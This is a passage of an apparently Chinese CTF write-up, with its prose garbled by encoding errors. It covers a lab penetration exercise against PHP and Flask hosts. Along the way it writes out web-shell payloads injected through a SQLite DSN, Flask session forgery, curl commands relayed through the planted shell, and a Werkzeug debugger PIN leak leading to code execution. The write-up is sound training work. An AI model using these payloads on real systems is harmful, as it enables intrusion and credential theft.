content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>è¯»äº†ä¹Ÿæ²¡å¾ˆå¤§çš„ç”¨å¤„ã€‚é¢˜ç›®æ˜¯æ¨ªå‘æ¸—é€ï¼Œä¹‹å‰ç»™äº†ä¸€ä¸ªå†…ç½‘ip 172.2.233.4ï¼Œè«éæ˜¯æ‰«cæ®µï¼Ÿ</p><p>æˆ‘å‹’ä¸ªè±†ï¼Ÿï¼Ÿéšä¾¿æ”¹äº†ä¸€ä½ç›´æ¥å‡ºäº†ã€‚ã€‚ã€‚ç¯å¢ƒå˜äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥172.2.233.4å˜ä¸º172.2.45.4</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101191643733.png" class="" title="This is an example image"><h2 id="ç¬¬ä¸‰ç« "><a href="#ç¬¬ä¸‰ç« " class="headerlink" title="ç¬¬ä¸‰ç« "></a>ç¬¬ä¸‰ç« </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è·³å²›æˆ˜æœ¯</span><br><span class="line">æ‹¿åˆ°config.phpä¸­çš„æ•°æ®åº“å¯†ç </span><br></pre></td></tr></table></figure><p>è·³å²›æˆ˜æœ¯ï¼Œè¢«å›°äº†å¥½ä¹…</p><p>8888ç«¯å£å¼€æ”¾äº†ä¸€ä¸ªflaskçš„æœåŠ¡</p><p>ç„¶åçœ‹çœ‹phpä»£ç </p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107152415587.png" class="" title="This is an example image"><p>è¿™å°æœºå™¨æ˜¯phpç¯å¢ƒï¼Œconfig.phpä¼°è®¡å°±åœ¨è¿™å°æœºå­ä¸Šäº†ã€‚</p><p>GETä¼ å‚ï¼Œå››ä¸ªå‚æ•°ï¼Œusernameã€passwordã€dsnã€query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=CREATE TABLE bad (name TEXT);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DCREATE%20TABLE%20bad%20%28name%20TEXT%29%3B</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=INSERT INTO bad (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DINSERT%20INTO%20bad%20%28name%29%20VALUES%20%28%27%3C%3Fphp%20file_put_contents%28%22cmd.php%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B0%5D%29%3B%3F%3E%22%29%3B%3F%3E%27%29%3B</span><br><span class="line"></span><br><span class="line">%3fdsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107163450520.png" class="" title="This is an example image"><p>sqliteçš„æ¯ä¸€ä¸ªæ•°æ®åº“å…¶å®éƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯åˆ›å»ºä¸€ä¸ªbadè¡¨å¹¶æœ‰å­—æ®µnameï¼Œè¿™ä¼šè¢«è®°å½•åˆ°phpæ–‡ä»¶ä¸­å»ã€‚ç¬¬äºŒä¸ªå‘½ä»¤ç›¸å½“äºå¾€nameå­—æ®µå†™å…¥ä¸€ä¸ªåé—¨ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨phpæ–‡ä»¶ä¸­å‡ºç°ï¼Œç„¶åæˆ‘ä»¬è®¿é—®aa.phpï¼Œå°±ä¼šè§¦å‘phpä»£ç ï¼Œä»è€Œäº§ç”Ÿåé—¨</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165825230.png" class="" title="This is an example image"><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250107165902352.png" alt="image-20250107165902352" style="zoom:80%;" /><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165902352.png" class="" title="This is an example image"><p>æˆåŠŸè·å¾—config.phpä¸­æ•°æ®åº“å¯†ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$database_host = &quot;localhost&quot;;</span><br><span class="line">$database_user = &quot;root&quot;;</span><br><span class="line">$database_password = &quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;;</span><br><span class="line">$database_name = &quot;web_db_2&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æäº¤parkåœ¨2024å¹´12æœˆ27æ—¥19æ—¶20åˆ†æ”¶åˆ°çš„é‚®ä»¶ä¸­çš„æ•°å­—</span><br><span class="line"></span><br><span class="line">æ ¼å¼ ctfshow&#123;æ•°å­—&#125;</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥æäº¤ 163é‚®ç®±çš„è´¦å·å¯†ç  æ ¼å¼ ctfshow&#123;è´¦å·_å¯†ç &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æ ¹ç›®å½•ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªsecret.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ã€‚</p><p>è·å¾—ä¸€ä¸²base64ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>è§£ç åæ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>é‚®ç®±å·åŠ å¯†ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å››ç« "><a href="#ç¬¬å››ç« " class="headerlink" title="ç¬¬å››ç« "></a>ç¬¬å››ç« </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤log_server_key.txtå†…å®¹</span><br></pre></td></tr></table></figure><p>æœ¬ç« çš„é‡ç‚¹æ˜¯flaskæœåŠ¡å™¨ï¼Œä¹‹å‰æˆ‘ä»¬çœ‹åˆ°è¿‡æºç ï¼Œåœ¨8888ç«¯å£</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165937711.png" class="" title="This is an example image"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è·å–åˆ°äº†ä¸€ä¸ªsessionå€¼ï¼Œçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiZ3Vlc3QifQ.Z3zuOw.FYFsUkqCVKObwblDG85AR5G7PRI</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107170758420.png" class="" title="This is an example image"><p>ç¬¬ä¸€é¢˜æˆ‘ä»¬çš„é‡ç‚¹æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±æ˜¯sessionä¼ªé€ å˜›ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107171222896.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬éœ€è¦æºå¸¦cookieè®¿é—®&#x2F;keyè·¯ç”±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://172.2.78.5/cmd.php?0=curl+http://172.2.78.6:8888/key+--cookie+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107172121397.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤flaskæ‰€åœ¨æœåŠ¡å™¨çš„/etc/passwd æ–‡ä»¶æœ€åä¸€è¡Œå†…å®¹</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“pinç æ³„éœ²ï¼Œåˆ›å»ºä¸€ä¸ªæ—¥å¿—ï¼Œç„¶åæŠŠpinç æ‰“å°åˆ°æ—¥å¿—ã€‚</p><p>è®¾ç½®loggernameä¸ºwerkzeugè®°å½•flaskçš„æ—¥å¿—ï¼ˆä¸çŸ¥é“çš„å¯ä»¥æ‰“ä¸ªæ–­ç‚¹çœ‹ä¸€ä¸‹ï¼Œåœ¨logdicté‡Œæœ‰ï¼‰</p><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250106215946821-295044882.png" alt="img"></p><p>æŸ¥ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“è¿™ä¸ªloggerå¯ä»¥è®°å½•flaskçš„æ—¥å¿—ï¼Œé‚£ä¹ˆæ‰“å°å‡ºæ¥çš„pinå°±ä¼šå‡ºç°åœ¨æ—¥å¿—ä¸­ï¼Œç„¶ågetlogcontentå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#è®¾ç½®log</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/set_log_option%3flogName=werkzeug%2526logFile=jwk.log&quot;&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124161450305.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è·å–consoleçš„é¡µé¢key</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/console&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">BDrrhrw6TzJCcFsCz6dj</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150000597.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#æ‰“å°pinç åˆ°æ—¥å¿—</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=printpin&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXByaW50cGluJnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150445453.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150510020.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯»log</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/get_log_content?logFile=jwk.log&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9nZXRfbG9nX2NvbnRlbnQ/bG9nRmlsZT1qd2subG9nIg==</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162224929.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">375-828-345</span><br></pre></td></tr></table></figure><p>ç»ˆäºè¯»åˆ°pinäº†ï¼Œå¡äº†å¥½ä¹…ã€‚ã€‚ã€‚</p><p>ç„¶åæˆ‘ä»¬pinauthä¸€ä¸‹ï¼Œè·å–cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTM3NS04MjgtMzQ1JnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162404620.png" class="" title="This is an example image"><p>æ˜¾ç¤ºauthä¸ºtrueï¼ŒéªŒè¯æˆåŠŸï¼Œè¿™é‡Œæˆ‘ä»¬ä¿å­˜cookieçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -v -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162717034.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzdc58fd521ffb0cae532091737707116|910ebc3905cd</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œrceï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 